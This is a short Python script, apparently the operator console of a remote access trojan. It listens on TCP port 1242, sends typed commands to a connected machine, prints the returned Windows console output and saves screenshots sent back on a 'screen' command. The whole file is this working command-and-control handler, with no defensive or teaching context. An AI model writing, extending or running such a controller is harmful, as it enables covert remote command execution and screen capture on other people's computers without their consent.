import socket as s
import io
from PIL import Image
import time

command = str()

mon_socket = s.socket(s.AF_INET,s.SOCK_STREAM)
mon_socket.bind(("",1242))
mon_socket.listen(5)
conf,info = mon_socket.accept()

print("Connexion établie %s "%(format(info)))
while command != "exit":
    command = input()
    conf.send(command.encode('UTF-8'))
    if command == "screen":
        message= conf.recv(262144)
        f = open("note","wb")
        f.write(message)
        f.close()
        #image.save("monitor-screen.png")
    if command == "candc":
        message= conf.recv(262144)
        message=message.decode("UTF-8")
        print(message)
    else:
        message = conf.recv(262144)
        print(message)
        message = message.decode('850')
        print(message)




mon_socket.close()
conf.close()
